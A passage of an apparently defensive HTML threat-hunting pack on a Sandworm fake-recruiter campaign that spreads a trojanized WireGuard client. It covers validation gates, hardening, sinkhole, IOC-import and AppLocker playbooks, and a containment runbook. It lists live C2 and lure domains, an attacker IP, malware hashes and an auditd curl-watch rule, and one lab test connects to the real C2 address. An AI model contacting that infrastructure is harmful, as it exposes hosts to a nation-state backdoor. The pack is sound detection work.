+      <tr><td>G3 · Positive control — hash/filename match</td><td>In an isolated lab VM only, place a benign, clearly-labelled test file named <code>SopraVPN.exe</code> and confirm the filename regex fires (do NOT use a real campaign sample)</td><td>Q1 returns the event; confirm the SHA256 arm separately with a labelled test hash</td></tr>
+      <tr><td>G4 · Positive control — parent/child</td><td>On the same lab host, spawn <code>powershell.exe</code> as a child of a process temporarily renamed <code>SopraVPN.exe</code></td><td>Q2 returns the event within the expected ingest delay</td></tr>
+      <tr><td>G5 · Positive control — network</td><td>From the lab host, attempt (and expect to fail/be blocked at the firewall) a connection to <code>139.28.36.23:51820/udp</code></td><td>Q4 and Q5 both return the connection attempt</td></tr>
+      <tr><td>G6 · Negative control</td><td>Confirm Q1, Q5 and Q6 produce zero hits on a 7-day window of a known-clean OU</td><td>Zero hits, or every hit explained and excluded</td></tr>
+      <tr><td>G7 · IOC ingest</td><td>Import the §10 CSV into Falcon IOC Management</td><td>All 13 rows accepted with no format errors</td></tr>
+      <tr><td>G8 · Promotion</td><td>14 days of clean pilot running for the four §9 IOA candidates</td><td>Fewer than one unexplained detection per 1,000 endpoints per week before moving Q1/Q5/Q6 to Prevent</td></tr>
+    </table>
+    <p class="callout callout-info">Use only benign, clearly-labelled test artifacts for the positive controls, in an isolated lab VM, and remove them immediately afterwards. Never stage a real SopraVPN sample or connect a production host to the published C2 infrastructure.</p>
+  </div>
+</div>
+
+<!-- 12 -->
+<div class="section" id="s12">
+  <div class="section-hdr"><span class="snum">12</span><h2>Hardening — Tiered</h2></div>
+  <div class="section-body">
+    <p>This campaign succeeds by exploiting trust at three layers: the hiring process itself (human), the VPN config file (technical, but invisible to binary-only inspection), and the unmanaged endpoint (policy). The controls below close each layer independently, since any one alone still leaves the others exposed.</p>
+
+    <div class="tier-blk tier-imm">
+      <div class="tier-lbl">Immediate — deploy this week</div>
+      <ul>
+        <li><strong>Block/sinkhole DNS</strong> for <code>soprasteria-bg.com</code>, <code>soprasteriabg.com</code>, <code>atlasgroup-ua.com</code>, <code>douncloud.site</code> at the resolver/firewall. <em>MITRE M1037 (Filter Network Traffic) · M1021 (Restrict Web-Based Content).</em> Verify: <code>nslookup soprasteria-bg.com &lt;resolver&gt;</code> returns a sinkhole address or NXDOMAIN.</li>
+        <li><strong>Import the §10 CSV</strong> into Falcon IOC Management: the five published SHA256/MD5 hashes at Prevent, domains and IP at Detect/Prevent. <em>MITRE M1040 (Behavior Prevention on Endpoint) · M1049 (Antivirus/Antimalware).</em> Verify: Falcon console → IOC Management shows all hashes in the intended state.</li>
+        <li><strong>Publish an internal advisory to IT/sysadmin staff:</strong> never install VPN clients or any software provided by a prospective employer before an accepted offer; verify any "Sopra Steria" or similar recruiter contact through the company's official site directly, never through a link the recruiter supplies. <em>MITRE M1017 (User Training).</em> Verify: advisory sent and acknowledgement tracked via the security-awareness platform.</li>
+      </ul>
+    </div>
+
+    <div class="tier-blk tier-near">
+      <div class="tier-lbl">Near term — 1 to 4 weeks, pilot first</div>
+      <ul>
+        <li><strong>Enforce that corporate resources (VPN, SSO, code repos) are reachable only from managed, EDR-enrolled devices</strong> — CERT-UA's explicit recommendation, and applies even to personal devices staff might use for interviews. <em>MITRE M1030 (Network Segmentation) · CIS Control 12 (Network Infrastructure Management).</em> Platform: Conditional Access (Entra ID) or NAC. Verify: attempt VPN/SSO login from an unmanaged test device and confirm block (Playbook 4, §13).</li>
+        <li><strong>Deploy an application-control rule</strong> (AppLocker/WDAC) blocking execution of unsigned/unknown VPN-client binaries named <code>SopraVPN*</code> outside an approved allowlist. <em>MITRE M1038 (Execution Prevention) · CIS Microsoft Windows Benchmark §Application Control.</em> Verify: attempt to run a benign, clearly-labelled test binary named <code>SopraVPN-test.exe</code> in a lab VM and confirm block + event log entry (Playbook 3, §13).</li>
+      </ul>
+    </div>
+
+    <div class="tier-blk tier-strat">
+      <div class="tier-lbl">Strategic — 1 to 3 months</div>
+      <ul>
+        <li><strong>Roll out a managed, centrally-provisioned corporate VPN client</strong> (a single approved WireGuard/IPsec build, digitally signed, distributed only via MDM/SCCM — never via a link a third party supplies), so "download a custom VPN client from a recruiter" can never be a plausible instruction to staff. <em>MITRE M1045 (Code Signing) · M1030 (Network Segmentation).</em> Verify: MDM/app inventory shows only the approved signed VPN client fleet-wide.</li>
+        <li><strong>Formalize a hiring-process security policy</strong> (HR + Security jointly owned) defining what a legitimate technical assessment can and cannot ask a candidate to install, with mandatory Security sign-off before any candidate-facing "test environment" instructions are sent. <span class="badge b-med">⚠ best-practice, no formal CIS/NIST benchmark for this HR-security control</span> — it directly closes the human-layer gap this entire campaign exploits. Verify: policy document exists, signed by HR + Security leads, referenced in the recruiter onboarding checklist.</li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- 13 -->
+<div class="section" id="s13">
+  <div class="section-hdr"><span class="snum">13</span><h2>Deployable Playbooks</h2></div>
+  <div class="section-body">
+
+    <h3>Playbook 1 — DNS sinkhole for campaign domains (BIND RPZ)</h3>
+<pre class="code">; Prerequisites: BIND 9.8+ with a configured response-policy zone (RPZ);
+;                rndc reload permission
+; Reboot required: No (rndc reload takes effect immediately, no service restart)
+; Rollback: remove the four CNAME records below from the RPZ zone file and
+;           rndc reload again
+
+; /etc/bind/db.rpz.sandworm-sopravpn — add these records
+soprasteria-bg.com      CNAME   rpz-drop.
+soprasteriabg.com       CNAME   rpz-drop.
+atlasgroup-ua.com       CNAME   rpz-drop.
+douncloud.site          CNAME   rpz-drop.
+
+; then:
+rndc reload
+
+; Verify:
+dig @&lt;resolver&gt; soprasteria-bg.com   ; expect NXDOMAIN or the sinkhole address</pre>
+
+    <h3>Playbook 2 — Falcon Custom IOC bulk import (falconpy)</h3>
+<pre class="code"># Prerequisites: pip install crowdstrike-falconpy; an API client with the
+#                "IOC Manager Write" scope
+# Reboot required: No
+# Rollback: delete the imported indicators via IOC.indicator_delete() using
+#           the returned indicator IDs, or set action="no_action" on each
+#           to soft-disable without deleting
+
+from falconpy import IOC
+
+falcon = IOC(client_id="REPLACE_WITH_CLIENT_ID", client_secret="REPLACE_WITH_CLIENT_SECRET")
+
+indicators = [
+    {"type": "sha256", "value": "4646ea832a61c9f7bdb11fee64ad82ae6d9856d2f3a4b36a8a4a571145be1260",
+     "action": "prevent", "severity": "critical", "platforms": ["windows"],
+     "description": "SopraVPN trojanized WireGuard installer (sopravpn_v7)",
+     "tags": ["campaign:Sandworm-SopraVPN"]},
+    {"type": "sha256", "value": "aeb702f65445d12605a84be6fa31545c71be0bf619b1cbedbee5800a43fc6793",
+     "action": "prevent", "severity": "critical", "platforms": ["windows"],
+     "description": "SopraVPN.exe trojanized WireGuard client (variant 1)",
+     "tags": ["campaign:Sandworm-SopraVPN"]},
+    {"type": "domain", "value": "soprasteria-bg.com", "action": "detect",
+     "severity": "high", "platforms": ["windows", "linux", "mac"],
+     "description": "spoofed Sopra Steria Bulgaria lure site",
+     "tags": ["campaign:Sandworm-SopraVPN"]},
+    {"type": "domain", "value": "douncloud.site", "action": "detect",
+     "severity": "critical", "platforms": ["windows", "linux", "mac"],
+     "description": "SopraVPN C2 check-in domain",
+     "tags": ["campaign:Sandworm-SopraVPN"]},
+    {"type": "ipv4", "value": "139.28.36.23", "action": "detect",
+     "severity": "critical", "platforms": ["windows", "linux", "mac"],
+     "description": "rogue WireGuard endpoint udp/51820",
+     "tags": ["campaign:Sandworm-SopraVPN"]},
+]
+
+response = falcon.indicator_create(comment="Sandworm SopraVPN campaign import", indicators=indicators)
+print(response["status_code"], response["body"])</pre>
+
+    <h3>Playbook 3 — Windows AppLocker deny rule for SopraVPN-named binaries</h3>
+<pre class="code"># Prerequisites: AppLocker policy service (Application Identity, AppIDSvc)
+#                running; Group Policy or Intune available to push the rule
+# Reboot required: No (gpupdate + AppIDSvc restart is sufficient)
+# Rollback: remove the deny rule from the AppLocker policy XML and re-push,
+#           or set the rule to "Audit only" to stop enforcing without deleting it
+
+# Deny rule (path-based), added to an AppLocker XML policy:
+# &lt;FilePathRule Id="..." Name="Block SopraVPN / unapproved VPN clients"
+#                Description="Sandworm SopraVPN campaign" UserOrGroupSid="S-1-1-0"
+#                Action="Deny"&gt;
+#   &lt;Conditions&gt;
+#     &lt;FilePathCondition Path="*\SopraVPN*.exe" /&gt;
+#   &lt;/Conditions&gt;
+# &lt;/FilePathRule&gt;
+
+# Verify the policy is enforced (not Audit-only):
+Get-AppLockerPolicy -Effective -Xml | Select-String "SopraVPN"
+
+# Force a re-evaluation on the target host:
+gpupdate /target:computer /force
+Restart-Service -Name AppIDSvc -Force</pre>
+
+    <h3>Playbook 4 — Conditional Access: require compliant device for VPN + SSO</h3>
+<pre class="code"># Prerequisites: Entra ID P1 (Conditional Access) or an equivalent NAC/ZTNA
+#                enforcement point in front of the VPN concentrator and SSO
+# Reboot required: No
+# Rollback: set the policy State to "Off" rather than deleting it, so the
+#           exact configuration can be re-enabled without rebuilding it
+
+# Conditional Access policy (Entra ID), summarized:
+Name:              Require compliant device for VPN + SSO
+Assignments:       All users -> Target resource: corporate VPN app registration, SSO apps
+Conditions:        Client apps = All; Device platforms = All
+Grant control:     Require device to be marked as compliant  (blocks unmanaged/BYOD)
+State:             Report-only for 1 week, then Enforced
+
+# Verify (Microsoft Graph PowerShell):
+Get-MgIdentityConditionalAccessPolicy -Filter "displayName eq 'Require compliant device for VPN + SSO'" |
+    Select-Object DisplayName, State</pre>
+
+    <h3>Playbook 5 — Linux auditd watch for timesyncd-check and curl</h3>
+<pre class="code">#!/usr/bin/env bash
+# Prerequisites: auditd installed and running (auditctl available)
+# Reboot required: No (auditctl -R takes effect immediately; the rules file
+#                  in /etc/audit/rules.d/ persists it across a future reboot)
+# Rollback: auditctl -D to clear all custom rules, or remove the specific
+#           watch lines below from the rules file and re-run augenrules --load
+
+# Watch the exact masquerade path CERT-UA published
+echo '-w /usr/libexec/timesyncd-check -p wax -k sandworm_sopravpn' >> /etc/audit/rules.d/sandworm-sopravpn.rules
+
+# Watch curl execution — pair with process-ancestry review in Falcon (Q6)
+echo '-w /usr/bin/curl -p x -k sandworm_sopravpn_curl' >> /etc/audit/rules.d/sandworm-sopravpn.rules
+
+augenrules --load
+auditctl -l | grep sandworm_sopravpn
+
+# Query after the fact:
+ausearch -k sandworm_sopravpn -i</pre>
+  </div>
+</div>
+
+<!-- 14 -->
+<div class="section" id="s14">
+  <div class="section-hdr"><span class="snum">14</span><h2>Containment Runbook</h2></div>
+  <div class="section-body">
+    <table>
+      <tr><th>Phase</th><th>Actions</th><th>Owner</th><th>Evidence to capture</th></tr>
+      <tr><td><strong>P0 · Triage</strong><br>0–30 min</td><td>Confirm the hit is genuine: pull the full process tree around the SopraVPN/wireguard process, the imported <code>.conf</code> file, and any child PowerShell/cURL process. Determine whether the tunnel actually came up.</td><td>SOC L1</td><td>Process tree, imported config file (do not delete yet), network connection log</td></tr>
+      <tr><td><strong>P1 · Isolate</strong><br>within 1 h</td><td>Network-contain the host via Falcon RTR. Do <em>not</em> reimage yet. Block outbound to <code>douncloud.site</code> and <code>139.28.36.23</code> org-wide immediately upon the first confirmed hit.</td><td>SOC L2 / Network</td><td>Containment timestamp; Falcon host ID; pre-block firewall/DNS logs</td></tr>
+      <tr><td><strong>P2 · Scope</strong><br>1–4 h</td><td>Run Q1–Q8 estate-wide over maximum retention. Identify every host that resolved campaign infrastructure or ran a SopraVPN-family binary. Ask the affected user for the recruiter's Telegram handle and email to widen the IOC set.</td><td>Threat hunting</td><td>Query result exports; affected-host list; recruiter contact details for CERT-UA reporting</td></tr>
+      <tr><td><strong>P3 · Eradicate</strong><br>4–24 h</td><td>Remove <code>SopraVPN*.exe</code> and <code>sopraconf*.conf</code> from disk; remove the matched scheduled task (Windows) or <code>/usr/libexec/timesyncd-check</code> (Linux). Rotate any credentials the affected sysadmin used post-infection (local admin, domain admin if elevated, any secrets stored on the box). <strong>If the scheduled task or cURL retrieval actually executed, treat the second-stage payload as unknown and reimage rather than clean.</strong></td><td>IR + Endpoint Eng + IAM</td><td>File hash + path + timestamps logged before deletion; credential-rotation ticket</td></tr>
+      <tr><td><strong>P4 · Block</strong><br>same day</td><td>Import the §10 IOC set fleet-wide. Push the §12 Immediate hardening items. Add the campaign domains to the SWG denylist.</td><td>Endpoint ops + network</td><td>IOC import receipt; DNS sinkhole config version</td></tr>
+      <tr><td><strong>P5 · Notify</strong><br>24–48 h</td><td>Report the fake recruiter contact to CERT-UA (<code>cert.gov.ua</code> / <code>@CERT_UA</code>) or the equivalent national CSIRT, and preserve the Telegram/email thread as evidence. If SourceForge project pages are still live, consider a takedown report to SourceForge.</td><td>IR lead + HR</td><td>Notification record; CERT case reference; exported chat transcript, sender email headers</td></tr>
+      <tr><td><strong>P6 · Recover</strong><br>2–7 d</td><td>Re-enroll the host in EDR, confirm managed-device compliance, and restore VPN/SSO access only after a clean sweep. Re-run Q1–Q8 at 7 and 30 days to catch dormant re-persistence.</td><td>IT Ops + IR</td><td>Compliance scan result; clean-sweep evidence</td></tr>
+      <tr><td><strong>P7 · Learn</strong><br>within 2 w</td><td>Fold every benign hit into the query TUNING lines. Promote the §9 IOA candidates. Debrief the affected employee and run a targeted awareness push using the real lure as the example.</td><td>Detection engineering + HR</td><td>Updated pack (bump to v0.2); IOA rule group export</td></tr>
+    </table>
+    <p class="callout callout-danger"><strong>Escalation trigger:</strong> a confirmed tunnel-up (Q4/Q5 hit) plus any child-process activity off the WireGuard binary (Q2, Q3, or Q6) means the backdoor fired, not just installed. Escalate to full incident response immediately — Sandworm's historical pattern is foothold, credential harvesting, lateral movement, then potentially destructive action against Ukrainian and allied infrastructure.</p>
+  </div>
+</div>
+
+<!-- 15 -->
+<div class="section" id="s15">
+  <div class="section-hdr"><span class="snum">15</span><h2>Detection Coverage Map</h2></div>
+  <div class="section-body">
+    <table>
+      <tr><th>Technique</th><th>Behavior</th><th>CQL</th><th>IOA</th><th>Coverage</th></tr>
+      <tr><td>T1593.001, T1585.001, T1583.001</td><td>Résumé harvesting, fake recruiter personas, campaign domain registration</td><td>—</td><td>—</td><td><span class="badge b-high">GAP</span> — pre-compromise, human-layer; not observable in Falcon, covered only by the awareness control in §12</td></tr>
+      <tr><td>T1204.002</td><td>SopraVPN install and execution</td><td>Q1</td><td>Yes (candidate)</td><td><span class="badge b-low">GOOD</span></td></tr>
+      <tr><td>T1027, T1140</td><td>AES-256-GCM payload hidden in config; custom Base64 alphabet</td><td>—</td><td>—</td><td><span class="badge b-high">GAP</span> — requires static config-content inspection, not process/network telemetry; covered by the native <code>grep SymmetricKey</code> hunt in §7</td></tr>
+      <tr><td>T1059.001, T1059.004</td><td>Decrypt-and-execute backdoor trigger (PowerShell / shell)</td><td>Q2</td><td>Investigate-only</td><td><span class="badge b-med">PARTIAL</span> — real benign population on the Linux PostUp side requires baselining</td></tr>
+      <tr><td>T1053.005, T1105</td><td>Windows scheduled-task 2nd stage</td><td>Q3</td><td>Yes (candidate, correlated)</td><td><span class="badge b-low">GOOD</span></td></tr>
+      <tr><td>T1105, T1036.005</td><td>Linux cURL 2nd stage / timesyncd-check masquerade</td><td>Q6</td><td>Yes (candidate)</td><td><span class="badge b-low">GOOD</span></td></tr>
+      <tr><td>T1071.001, T1583.001</td><td>DNS/network to confirmed lure and C2 infrastructure</td><td>Q4, Q8</td><td>No (IOC-managed instead)</td><td><span class="badge b-low">GOOD</span> for static IOCs; <span class="badge b-med">PARTIAL</span> for cadence-based Q8 pending baseline</td></tr>
+      <tr><td>T1572, T1090</td><td>WireGuard tunnel to rogue endpoint / tunneled 2nd-stage retrieval</td><td>Q5</td><td>Yes (candidate)</td><td><span class="badge b-low">GOOD</span> for the outer tunnel connection; <span class="badge b-med">PARTIAL</span> for the tunneled payload itself — Falcon cannot see inside the encrypted tunnel traffic</td></tr>
+      <tr><td>T1608.001</td><td>SourceForge hosting of the trojanized installer</td><td>Q7</td><td>No (pivot-only)</td><td><span class="badge b-med">PARTIAL</span> — high FP, DNS-level only, must be correlated with Q1</td></tr>
+    </table>
+    <h3>Known gaps and what to do about them</h3>
+    <ul>
+      <li><strong>Human-layer recon/resource-dev (3 gaps).</strong> Everything before the malicious download happens off any endpoint you control. Closing this is a policy and awareness problem (§12 Immediate #3, Strategic #2), not a detection problem.</li>
+      <li><strong>Config-content backdoor.</strong> The <code>SymmetricKey</code> string and the custom Base64 alphabet live inside a data file, not in process/network telemetry — Falcon's process and network event model cannot inspect arbitrary config-file contents. The native <code>grep</code> hunt in §7 and the endpoint audit in §10 are the only coverage for this specific technique.</li>
+      <li><strong>Encrypted tunnel payload.</strong> Once the WireGuard tunnel is up, the Linux second-stage cURL retrieval travels inside it — Falcon sees the outer tunnel connection (Q5) but not the inner HTTP(S)/plaintext request to attacker infrastructure.</li>
+    </ul>
+    <p><strong>Validation summary:</strong> gates G1–G8 in §11 govern promotion. G1 (telemetry present, both platforms) and G3–G5 (positive controls) must pass before any query is treated as coverage; G2 and G6 (baseline and negative control) must pass before any IOA moves past Monitor; G8 governs the move to Prevent. A query that has not passed its gate is a hypothesis, not a detection.</p>
+  </div>
+</div>
+
+<!-- 16 -->
+<div class="section" id="s16">
+  <div class="section-hdr"><span class="snum">16</span><h2>Hunt Summary Ticket</h2></div>
+  <div class="section-body">
+    <div class="ticket">
+<pre class="code">TITLE:      Sandworm/UAC-0145 Fake-Recruiter SopraVPN Trojanized WireGuard Hunt
+SEVERITY:   High - nation-state, privileged-access targeting, confirmed atomic IOCs
+SCOPE:      Windows + Linux endpoints belonging to IT/sysadmin staff; email gateway;
+            DNS/network egress; managed-device compliance posture
+
+HYPOTHESIS: A fake-recruiter social-engineering chain (job platform -> Telegram ->
+            Zoom -> bogus VPN "technical assessment") has delivered SopraVPN, a
+            trojanized WireGuard client that decrypts and executes attacker commands
+            hidden in the VPN config file (SymmetricKey / AES-256-GCM), and additional
+            hosts may be compromised via scheduled task (Windows) or VPN-tunneled
+            cURL retrieval (Linux).
+
+QUERIES:    Q1  SopraVPN execution (hash/filename)          CONF high  FP low
+            Q2  WireGuard parent spawning PS/shell           CONF high  FP med
+            Q3  Scheduled task after SopraVPN                CONF high  FP med
+            Q4  Network/DNS to campaign infrastructure        CONF high  FP low
+            Q5  UDP/51820 to rogue endpoint                   CONF high  FP low
+            Q6  Linux cURL / timesyncd-check masquerade       CONF high  FP med
+            Q7  SourceForge download (pivot only)             CONF med   FP high
+            Q8  Beaconing to douncloud[.]site                 CONF med   FP med
+
+DO FIRST:   1. Run Q1 and Q4 against the last 90 days; either firing is a confirmed
+               incident, not a hunt lead.
+            2. If either fires, isolate the host (Falcon RTR contain) before running
+               Q2/Q3/Q6 to scope the blast radius.
+            3. Import the section 10 IOC CSV at Prevent for the published hashes.
+            4. Sinkhole the four campaign domains (Playbook 1).
+
+FINDINGS:   [pending - record hit counts per query and the referring recruiter
+            contact details]
+
+GAPS:       Recon/resource-dev stages are human-layer, not visible in Falcon (see
+            s15). Config-content backdoor (SymmetricKey string) requires a native
+            file-content hunt (s7), not CQL. Tunneled 2nd-stage retrieval on Linux
+            is invisible once inside the WireGuard tunnel.
+
+ACTIONS:    Immediate  - DNS sinkhole, IOC import, user briefing on the hiring-lure
+                         pattern
+            Near term  - managed-device-only access to corporate resources,
+                         AppLocker/WDAC deny rule for SopraVPN-named binaries
+            Strategic  - single MDM-distributed signed corporate VPN client,
+                         formal HR+Security hiring-process policy
+
+OWNER:      HuntPack
+VERSION:    v0.1 - 2026-08-23</pre>
+    </div>
+  </div>
+</div>
+
+<!-- 17 -->
+<div class="section" id="s17">
+  <div class="section-hdr"><span class="snum">17</span><h2>Changelog</h2></div>
+  <div class="section-body">
+    <div class="chg-entry"><span class="chg-ver">v0.1</span><span class="chg-date">2026-08-23</span><span>Initial release. Built from the CERT-UA primary advisory (published 2026-08-08, article 6318863) plus four corroborating secondary sources (The Hacker News, BleepingComputer, The Record/Recorded Future News, TechTimes), all published 2026-08-10/11. Eight CQL hunt queries, four Custom IOA candidates, five atomic file hashes (SHA256+MD5), four domains and one IP with full provenance traced to the saved CERT-UA source snapshot. Scoped deliberately to the fake-recruiter/trojanized-VPN-config vector; does not duplicate the previously-published UAC0145-ClickFix-Hunt pack (CAPTCHA lures, a distinct typosquat C2 domain, GHETTOVIBE/FLUIDLEECH/FREAKYPOLL/SMARTAXE/COWARDDUCK), which covers a different UAC-0145 access track.</span></div>
+  </div>
+</div>
+
+<!-- 18 -->
+<div class="section" id="s18">
+  <div class="section-hdr"><span class="snum">18</span><h2>References</h2></div>
+  <div class="section-body">
+    <table>
+      <tr><th>Tier</th><th>Source</th><th>Used for</th><th>Accessed</th></tr>
+      <tr><td><span class="badge b-crit">T1</span></td><td><a href="https://cert.gov.ua/article/6318863">CERT-UA — Соціальна інженерія у виконанні UAC-0145: компрометація у процесі працевлаштування (article 6318863)</a></td><td>Primary. Full campaign narrative, technical backdoor mechanism, and every atomic indicator in this pack.</td><td>2026-08-23</td></tr>
+      <tr><td><span class="badge b-high">T2</span></td><td><a href="https://thehackernews.com/2026/08/sandworm-linked-uac-0145-uses-fake-job.html">The Hacker News — Sandworm-Linked UAC-0145 Uses Fake Job Interviews to Push VPN That Can Run Commands</a></td><td>Corroboration; additional SourceForge project name (hunt lead only).</td><td>2026-08-23</td></tr>
+      <tr><td><span class="badge b-high">T2</span></td><td><a href="https://www.bleepingcomputer.com/news/security/sandworm-hackers-target-it-pros-with-trojanized-wireguard-vpn-client/">BleepingComputer — Sandworm hackers target IT pros with trojanized WireGuard VPN client</a></td><td>Corroboration and alert-copy phrasing.</td><td>2026-08-23</td></tr>
+      <tr><td><span class="badge b-med">T2/3</span></td><td><a href="https://therecord.media/russian-military-hackers-pose-as-recruiters-ukraine-it-workers">The Record / Recorded Future News — Russian military hackers pose as recruiters to target Ukrainian IT workers</a></td><td>Independent corroboration; Telegram-handle context; broader Sandworm history.</td><td>2026-08-23</td></tr>
+      <tr><td><span class="badge b-med">T2/3</span></td><td><a href="https://www.techtimes.com/articles/323950/20260811/sandworm-recruiter-scam-targets-ukrainian-sysadmins-deploys-hidden-wireguard-trojan.htm">TechTimes — Sandworm Recruiter Scam Targets Ukrainian Sysadmins, Deploys Hidden WireGuard Trojan</a></td><td>Deep secondary analysis, "Contagious Interview" framing, and defender guidance.</td><td>2026-08-23</td></tr>
+      <tr><td><span class="badge b-info">Ref</span></td><td><a href="https://attack.mitre.org/techniques/T1204/002/">MITRE ATT&amp;CK T1204.002 — User Execution: Malicious File</a></td><td>Technique mapping for the SopraVPN install step.</td><td>2026-08-23</td></tr>
+      <tr><td><span class="badge b-info">Ref</span></td><td><a href="https://attack.mitre.org/techniques/T1027/">MITRE ATT&amp;CK T1027 — Obfuscated Files or Information</a></td><td>Technique mapping for the config-hidden AES-256-GCM payload.</td><td>2026-08-23</td></tr>
+      <tr><td><span class="badge b-info">Ref</span></td><td><a href="https://www.cisecurity.org/cis-benchmarks">CIS Benchmarks (Microsoft Windows)</a></td><td>Baseline citation for §12 application-control hardening.</td><td>2026-08-23</td></tr>
+    </table>
+  </div>
+</div>
+
+<footer>
+  HuntPack · Sandworm / UAC-0145 SopraVPN Fake-Recruiter Campaign · v0.1 · Generated 2026-08-23 · Author: HuntPack<br>
+  Defensive content only. Validate all queries in your own tenant before promoting to Prevent.
+</footer>
+
+</div>
+
+<script>
+function toggleToc() {
+  document.body.classList.toggle('toc-collapsed');
+  if (window.matchMedia('(max-width: 768px)').matches) {
+    document.body.classList.toggle('toc-shown');
+  }
+}
+function copyQuery(id, btn) {
+  var pre = document.getElementById(id);
+  var text = pre ? pre.innerText : '';
+  navigator.clipboard.writeText(text).then(function () {
+    btn.textContent = 'Copied!'; btn.classList.add('copied');
+    setTimeout(function () { btn.textContent = 'Copy CQL'; btn.classList.remove('copied'); }, 2000);
+  }).catch(function () {
+    var ta = document.createElement('textarea'); ta.value = text;
+    document.body.appendChild(ta); ta.select(); document.execCommand('copy'); document.body.removeChild(ta);
+    btn.textContent = 'Copied!'; btn.classList.add('copied');
+    setTimeout(function () { btn.textContent = 'Copy CQL'; btn.classList.remove('copied'); }, 2000);
+  });
+}
+function copyBlock(id, btn) {
+  var pre = document.getElementById(id);
+  var text = pre ? pre.innerText : '';
+  var label = btn.getAttribute('data-label') || 'Copy';
+  function done() { btn.textContent = 'Copied!'; btn.classList.add('copied'); setTimeout(function () { btn.textContent = label; btn.classList.remove('copied'); }, 2000); }
+  navigator.clipboard.writeText(text).then(done).catch(function () {
+    var ta = document.createElement('textarea'); ta.value = text; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); document.body.removeChild(ta); done();
+  });
+}
+function openFalcon(id) {
+  var region = document.getElementById('cloud-region').value;
+  var pre = document.getElementById(id);
+  if (!pre || !region) return;
+  var cleaned = pre.innerText.trim();
+  var url = region + '/investigate/search?repo=all&start=7d&end=&searchViewInteractions=NoXSA&timezone=UTC&query=' + encodeURIComponent(cleaned);
+  window.open(url, '_blank');
+}
+var sections = document.querySelectorAll('.section');
+window.addEventListener('scroll', function () {
+  var scrollY = window.scrollY + 60;
+  sections.forEach(function (sec) {
+    if (scrollY >= sec.offsetTop) {
+      document.querySelectorAll('#sidebar nav a').forEach(function (a) { a.classList.remove('active'); });
+      var link = document.querySelector('#sidebar nav a[href="#' + sec.getAttribute('id') + '"]');
+      if (link) link.classList.add('active');
+    }
+  });
+});
+</script>
+</body>
+</html>
